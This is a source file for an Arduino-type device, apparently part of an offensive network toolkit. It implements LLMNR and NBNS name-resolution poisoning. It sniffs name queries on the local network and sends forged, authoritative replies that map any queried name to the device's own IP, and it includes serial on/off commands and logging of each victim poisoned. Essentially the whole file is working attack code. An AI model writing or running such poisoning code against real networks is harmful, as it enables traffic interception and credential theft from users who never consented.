// SPDX-License-Identifier: Apache-2.0
// Copyright 2026 0x4133

#include "attack_nbns_poison.h"

#include <string.h>

#include <Arduino.h>

#include "config.h"
#include "dns_util.h"
#include "eth_frame.h"
#include "inject.h"
#include "state.h"

bool     poisonEnabled = false;
uint32_t poisonCount   = 0;

void poisonCheckPacket(const uint8_t* pkt, uint16_t len) {
  if (len < ETH_HEADER_LEN + 28)
    return;
  uint16_t etype = pktRead16(pkt + ETH_TYPE);
  if (etype != ETHERTYPE_IPV4)
    return;

  const uint8_t* ipHdr = pkt + ETH_HEADER_LEN;
  if (ipHdr[9] != IP_PROTO_UDP)
    return;

  uint8_t ipHdrLen = (ipHdr[0] & 0x0F) * 4;
  if (len < ETH_HEADER_LEN + ipHdrLen + 8)
    return;

  const uint8_t* udpHdr = ipHdr + ipHdrLen;
  uint16_t dstPort = pktRead16(udpHdr + 2);
  uint16_t udpLen = pktRead16(udpHdr + 4);
  const uint8_t* srcIP = ipHdr + 12;

  // Ignore our own packets
  if (memcmp(srcIP, ourIP, 4) == 0)
    return;
  if (memcmp(pkt + ETH_SRC_MAC, mac, 6) == 0)
    return;

  // ── LLMNR (port 5355) — same wire format as DNS ──
  if (dstPort == LLMNR_PORT && udpLen >= 8 + 12) {
    const uint8_t* dns = udpHdr + 8;
    uint16_t dnsLen = udpLen - 8;
    uint16_t flags = pktRead16(dns + 2);
    if (flags & 0x8000)
      return;  // response, not query
    uint16_t qdcount = pktRead16(dns + 4);
    if (qdcount == 0)
      return;

    uint16_t txid = pktRead16(dns);
    uint16_t clientPort = pktRead16(udpHdr);

    // Decode name for logging
    char name[64];
    dnsDecodeName(dns, dnsLen, 12, name, sizeof(name));

    // Get qname bytes
    uint16_t qnameLen = 0;
    const uint8_t* qname = dns + 12;
    uint16_t qpos = 12;
    while (qpos < dnsLen && dns[qpos] != 0) {
      qpos += 1 + dns[qpos];
    }
    qnameLen = qpos + 1 - 12;

    // Build LLMNR response
    uint16_t pos = 0;
    pos = buildEthHeader(txBuf, pkt + ETH_SRC_MAC, ETHERTYPE_IPV4);

    uint16_t dnsRespLen = 12 + qnameLen + 4 + 12 + 4;
    uint16_t udpRespLen = 8 + dnsRespLen;

    pos += buildIPv4Header(txBuf + pos, ourIP, srcIP, IP_PROTO_UDP, udpRespLen);

    uint16_t uStart = pos;
    pktWrite16(txBuf + pos, LLMNR_PORT);
    pos += 2;
    pktWrite16(txBuf + pos, clientPort);
    pos += 2;
    pktWrite16(txBuf + pos, udpRespLen);
    pos += 2;
    pktWrite16(txBuf + pos, 0);
    pos += 2;

    pktWrite16(txBuf + pos, txid);
    pos += 2;
    pktWrite16(txBuf + pos, 0x8000);
    pos += 2;  // Response, no error
    pktWrite16(txBuf + pos, 1);
    pos += 2;  // QD
    pktWrite16(txBuf + pos, 1);
    pos += 2;  // AN
    pktWrite16(txBuf + pos, 0);
    pos += 2;
    pktWrite16(txBuf + pos, 0);
    pos += 2;

    memcpy(txBuf + pos, qname, qnameLen);
    pos += qnameLen;
    pktWrite16(txBuf + pos, 0x0001);
    pos += 2;  // A
    pktWrite16(txBuf + pos, 0x0001);
    pos += 2;  // IN

    pktWrite16(txBuf + pos, 0xC00C);
    pos += 2;  // pointer to name
    pktWrite16(txBuf + pos, 0x0001);
    pos += 2;  // A
    pktWrite16(txBuf + pos, 0x0001);
    pos += 2;  // IN
    pktWrite32(txBuf + pos, 30);
    pos += 4;  // TTL
    pktWrite16(txBuf + pos, 4);
    pos += 2;  // RDLEN
    memcpy(txBuf + pos, ourIP, 4);
    pos += 4;  // Our IP

    sendRawFrame(txBuf, pos);
    poisonCount++;
    Serial.printf("[POISON] LLMNR: %s -> %u.%u.%u.%u (from %u.%u.%u.%u)\n", name, ourIP[0],
                  ourIP[1], ourIP[2], ourIP[3], srcIP[0], srcIP[1], srcIP[2], srcIP[3]);
  }

  // ── NBNS (port 137) ──
  if (dstPort == NBNS_PORT && udpLen >= 8 + 12) {
    const uint8_t* nbns = udpHdr + 8;
    uint16_t nbnsLen = udpLen - 8;
    uint16_t flags = pktRead16(nbns + 2);
    if (flags & 0x8000)
      return;  // response
    uint16_t qdcount = pktRead16(nbns + 4);
    if (qdcount == 0)
      return;

    uint16_t txid = pktRead16(nbns);
    uint16_t clientPort = pktRead16(udpHdr);

    // Decode NetBIOS name (first-level encoding)
    char nbName[17] = {0};
    if (nbnsLen >= 12 + 34) {          // 32-byte encoded name + length byte + null
      const uint8_t* enc = nbns + 13;  // skip length byte (0x20)
      for (int i = 0; i < 15; i++) {
        char c = ((enc[i * 2] - 'A') << 4) | (enc[i * 2 + 1] - 'A');
        nbName[i] = (c >= 0x20 && c < 0x7F) ? c : ' ';
      }
      nbName[15] = '\0';
      // Trim trailing spaces
      for (int i = 14; i >= 0 && nbName[i] == ' '; i--)
        nbName[i] = '\0';
    }

    // Build NBNS response
    uint16_t pos = 0;
    pos = buildEthHeader(txBuf, pkt + ETH_SRC_MAC, ETHERTYPE_IPV4);

    // NBNS response: header(12) + name(34+2+2) + answer(34+2+2+4+2+6)
    uint16_t nbnsRespLen = 12 + 38 + 50;
    uint16_t udpRespLen = 8 + nbnsRespLen;

    pos += buildIPv4Header(txBuf + pos, ourIP, srcIP, IP_PROTO_UDP, udpRespLen);

    pktWrite16(txBuf + pos, NBNS_PORT);
    pos += 2;
    pktWrite16(txBuf + pos, clientPort);
    pos += 2;
    pktWrite16(txBuf + pos, udpRespLen);
    pos += 2;
    pktWrite16(txBuf + pos, 0);
    pos += 2;

    // NBNS header
    pktWrite16(txBuf + pos, txid);
    pos += 2;
    pktWrite16(txBuf + pos, 0x8500);
    pos += 2;  // Response, Authoritative
    pktWrite16(txBuf + pos, 0);
    pos += 2;  // QD=0
    pktWrite16(txBuf + pos, 1);
    pos += 2;  // AN=1
    pktWrite16(txBuf + pos, 0);
    pos += 2;
    pktWrite16(txBuf + pos, 0);
    pos += 2;

    // Answer: copy the encoded name from the query
    if (nbnsLen >= 12 + 34) {
      memcpy(txBuf + pos, nbns + 12, 34);
      pos += 34;
    } else {
      memset(txBuf + pos, 0, 34);
      pos += 34;
    }
    pktWrite16(txBuf + pos, 0x0020);
    pos += 2;  // NB type
    pktWrite16(txBuf + pos, 0x0001);
    pos += 2;  // IN class
    pktWrite32(txBuf + pos, 300);
    pos += 4;  // TTL
    pktWrite16(txBuf + pos, 6);
    pos += 2;  // RDLENGTH
    pktWrite16(txBuf + pos, 0x0000);
    pos += 2;  // NB flags
    memcpy(txBuf + pos, ourIP, 4);
    pos += 4;  // Our IP

    sendRawFrame(txBuf, pos);
    poisonCount++;
    Serial.printf("[POISON] NBNS: %s -> %u.%u.%u.%u (from %u.%u.%u.%u)\n", nbName, ourIP[0],
                  ourIP[1], ourIP[2], ourIP[3], srcIP[0], srcIP[1], srcIP[2], srcIP[3]);
  }
}

void parsePoisonCommand(const char* cmd) {
  while (*cmd == ' ')
    cmd++;

  if (strncmp(cmd, "on", 2) == 0) {
    poisonEnabled = true;
    poisonCount = 0;
    Serial.println("[POISON] NBNS/LLMNR poisoning ENABLED");
    Serial.println("[POISON] Responding to name queries with our IP");
  } else if (strncmp(cmd, "off", 3) == 0) {
    poisonEnabled = false;
    Serial.printf("[POISON] Disabled. %u responses sent.\n", poisonCount);
  } else {
    Serial.printf("[POISON] %s (%u responses)\n", poisonEnabled ? "ACTIVE" : "Disabled",
                  poisonCount);
    Serial.println("  poison on   - start responding to NBNS/LLMNR");
    Serial.println("  poison off  - stop");
  }
}
